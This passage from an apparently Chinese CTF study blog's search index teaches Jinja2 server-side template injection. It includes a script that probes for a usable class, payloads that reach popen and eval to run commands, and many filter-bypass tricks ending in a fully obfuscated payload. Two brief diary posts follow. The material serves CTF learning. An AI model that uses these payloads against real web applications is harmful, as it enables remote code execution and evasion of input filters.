<br></code></pre></td></tr></table></figure><p>接下来的话，就要找可利用的类，寻找那些有回显的或者可以执行命令的类<br>大多数利用的是<code>os._wrap_close</code>这个类，我们这里可以用一个简单脚本来寻找它对应的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8888/?name=\</span><br><span class="hljs-string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>    res = requests.get(url=url, headers=headers)<br>    <span class="hljs-comment">#print(res.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>接下来就可以利用<code>os。_wrap_close</code>，这个类中有<code>popen</code>方法，我们去调用它<br>首先<br>先调用它的__init__方法进行初始化类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__&#125;&#125;<br></code></pre></td></tr></table></figure><p>此时就可以去进行RCE了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>还有一个比较厉害的模块，就是<code>__builtins__</code>,它里面有<code>eval()</code>等函数，我们可以也利用它来进行RCE<br>它的payload是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="4-SSTI常见的绕过方式"><a href="#4-SSTI常见的绕过方式" class="headerlink" title="4.SSTI常见的绕过方式"></a>4.SSTI常见的绕过方式</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过  ."></a>绕过  .</h2><p>当.被ban时，有以下几种绕过方式</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">1、用[]代替.</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>[&#x27;__class&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、用attr()过滤器绕过</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过 _"></a>绕过 _</h2><p>当<code>_</code>被ban时，有以下几种绕过方式</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">1、通过list获取字符列表，然后用pop来获取_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list).pop(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(a)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、可以通过字符编码的方式进行绕过，举个16进制编码例子 可以编码绕过 python解析器支持 hex ，unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125;</span><span class="language-xml"> =</span><span class="hljs-template-variable">&#123;&#123;().__class__&#125;&#125;</span><br></code></pre></td></tr></table></figure>使用{%set%}构造下划线<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">sb</span> = dict(aaaaaaaaaaaaaaaaaa=<span class="hljs-keyword">a</span>) | <span class="hljs-keyword">join</span> | <span class="hljs-built_in">count</span> %&#125;<br>&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">pop</span>=dict(<span class="hljs-keyword">pop</span>=<span class="hljs-keyword">a</span>)|<span class="hljs-keyword">join</span>%&#125;<br>&#123;% <span class="hljs-keyword">set</span> xiahuaxian = (lipsum | <span class="hljs-built_in">string</span> | <span class="hljs-keyword">list</span>) | attr(<span class="hljs-keyword">pop</span>)(<span class="hljs-keyword">sb</span>) %&#125;<br><br>小标按照实际情况写<br></code></pre></td></tr></table></figure><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过 []"></a>绕过 []</h2><p>经常有中括号被ban的情况出现，这个时候可以使用<code>pop</code>或<code>__getitem__()</code>代替索引中的&#96;[]，它的作用简单说就是可以把中括号转换为括号的形式，举个例子</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__bases__</span>[0]=<span class="hljs-emphasis">__bases__</span>.<span class="hljs-emphasis">__getitem__</span>(0)<br></code></pre></td></tr></table></figure>## 绕过{{}}有时候为了防止SSTI，可能程序员会ban掉{{，这个时候我们可以利用jinja2的语法，用{%来进行RCE，举个例子我们平常使用的payload<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;dir&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>修改后的payload</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;%print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]. <span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">138</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read())%&#125;<br></code></pre></td></tr></table></figure><p>也可以借助for循环和if语句来执行命令</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%print i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><h2 id="绕过单引号双引号-传参绕过"><a href="#绕过单引号双引号-传参绕过" class="headerlink" title="绕过单引号双引号   传参绕过"></a>绕过单引号双引号   传参绕过</h2><p>过滤了单、双引号，有两种方法绕过</p><p>request绕过</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#post</span><br><span class="language-xml"># __builtins__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[80].__init__.__globals__.__builtins__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).popen(<span class="hljs-name">request.values.arg3</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=__import__,arg2=os,arg3=popen</span><br><span class="language-xml"></span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"># os</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[213].__init__.__globals__[request.values.arg1].popen(<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#cookie</span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.cookies.arg1](<span class="hljs-name">request.cookies.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Cookie:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>chr()绕过</p><p>先找出chr函数位置</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__mro__</span>[-1].<span class="hljs-emphasis">__subclasses__</span>()[0].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.chr&#125;&#125;<br></code></pre></td></tr></table></figure>{%set%}拼接绕过   适合大部分过滤<h2 id="绕过args"><a href="#绕过args" class="headerlink" title="绕过args"></a>绕过args</h2><p>当使用args的方法绕过<code>&#39;</code>和<code>&quot;</code>时，可能遇见args被ban的情况，这个时候可以采用<code>request.cookies</code>和<code>request.values</code>，他们利用的方式大同小异，示例如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">GET:&#123;&#123;url_for.__globals__<span class="hljs-selector-attr">[request.cookies.a]</span>&#125;&#125;<br>COOkie: <span class="hljs-string">&quot;a&quot;</span> :<span class="hljs-string">&#x27;__builtins__&#x27;</span><br></code></pre></td></tr></table></figure>使用{%set%}拼接绕过<h2 id="绕过数字"><a href="#绕过数字" class="headerlink" title="绕过数字"></a>绕过数字</h2><p>有时候可能会遇见数字<code>0-9</code>被ban的情况，这个时候我们可以通过count来得到数字，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">dict</span>(<span class="hljs-name">e</span>=a)|join|count)&#125;&#125;</span><span class="language-xml">  #获得字典拼接后字符串的长度</span><br></code></pre></td></tr></table></figure><h2 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h2><p>有时候可能遇见<code>class</code>、<code>base</code>这种关键词被绕过的情况，我们这个时候通常使用的绕过方式是使用join拼接从而实现绕过，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">dict</span>(<span class="hljs-name">__in</span>=a,<span class="hljs-attr">it__</span>=a)|join&#125;&#125;</span><span class="language-xml">  =__init__</span><br></code></pre></td></tr></table></figure><h1 id="SSTI实战"><a href="#SSTI实战" class="headerlink" title="SSTI实战"></a>SSTI实战</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">目的<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>payload:<br>&#123;% <span class="hljs-built_in">set</span> s = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> si = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> sb = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-attribute">pop</span>=dict(pop=a)|join%&#125;<br>&#123;% <span class="hljs-built_in">set</span> xiahuaxian = (lipsum | string | list) | attr(pop)(sb) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> a = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">glo</span>=a, <span class="hljs-attribute">bals</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> b = dict(<span class="hljs-attribute">o</span>=a, <span class="hljs-attribute">s</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c = dict(<span class="hljs-attribute">po</span>=a, <span class="hljs-attribute">pen</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> d = dict(<span class="hljs-attribute">re</span>=a, <span class="hljs-attribute">ad</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> e = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">get</span>=a, <span class="hljs-attribute">item</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> f = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">buil</span>=a, <span class="hljs-attribute">tins</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ch = dict(<span class="hljs-attribute">ch</span>=a, <span class="hljs-attribute">r</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> chh = lipsum | attr(a) | attr(e)(f) | attr(e)(ch) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd = (dict(<span class="hljs-attribute">ca</span>=a, <span class="hljs-attribute">t</span>=a) | join, chh(s), chh(si), dict(<span class="hljs-attribute">ap</span>=a, <span class="hljs-attribute">p</span>=a) | join, chh(si), dict(<span class="hljs-attribute">fl</span>=a, <span class="hljs-attribute">ag</span>=a) | join) | join %&#125;<br>&#123;&#123; lipsum | attr(a) | attr(e)(b) | attr(c)(cmd) | attr(d)() &#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>问自己</title>
    <link href="/tuyi/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/"/>
    <url>/tuyi/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/</url>
    
    <content type="html"><![CDATA[<p>我靠，忘记自己还搭建过这样一个博客，期末忙昏了，现在放假了，就可以好好打点一下了，写一点东西记录自己的学习日常，一个人学习感觉好盲目，只有在写点什么的时候才会思考自己要做什么，（1.19）</p><p>从今天开始每天写至少一道web题   （1.22）</p><p>我靠，要过年了感觉动力不是很够了 （1.24）</p><p>要过年了，国内没啥比赛了，国外大不是很想打，还是复习复习吧，每日一web暂停一段时间，更点知识点吧，(1.26)</p>]]></content>
    
    
    
    <tags>
      
      <tag>目标</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开站</title>
    <link href="/tuyi/2024/11/12/%E5%BC%80%E7%AB%99/"/>
    <url>/tuyi/2024/11/12/%E5%BC%80%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>搭建一个小站，纪录自己的学习和分享一些东西</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
